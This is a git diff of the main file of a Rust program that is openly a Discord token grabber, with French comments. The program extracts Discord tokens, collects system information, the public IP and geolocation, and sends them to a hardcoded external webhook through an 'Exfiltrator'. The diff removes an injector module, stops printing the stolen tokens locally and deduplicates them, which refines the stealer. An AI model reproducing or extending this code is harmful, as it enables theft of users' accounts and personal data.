@@ -1,12 +1,10 @@
 mod exfiltrator;
 mod extractor;
-mod injector;
 mod obfuscation;
 mod utils;
 
 use exfiltrator::Exfiltrator;
 use extractor::Extractor;
-use injector::Injector;
 use serde_json::json;
 use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};
 
@@ -37,7 +35,6 @@ async fn main() {
     }
 
     //Init
-    let injector = Injector::new();
     let extractor = Extractor::new();
     let webhook_url = "https://rust.vullwen.com/webhook.php";
     let exfiltrator = Exfiltrator::new(webhook_url);
@@ -45,6 +42,8 @@ async fn main() {
     let mut entries = Vec::new();
 
     let tokens = extractor.extract_discord_tokens();
+    //supprimer les doublons
+    let tokens: Vec<String> = tokens.into_iter().collect::<std::collections::HashSet<_>>().into_iter().collect();
     let sys_info = get_system_info();
     let ts = get_timestamp();
     let location = match get_geolocation(&ip).await {
@@ -65,12 +64,7 @@ async fn main() {
     // 5. Envoi
     if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
         eprintln!("Erreur lors de l’exécution : {}", err);
-    } else {
-        println!("Tokens Discord extraits :");
-        for token in &tokens {
-            println!("  {}", token);
-        }
-    }
+    } 
 }
 
 async fn run_token_grabber(
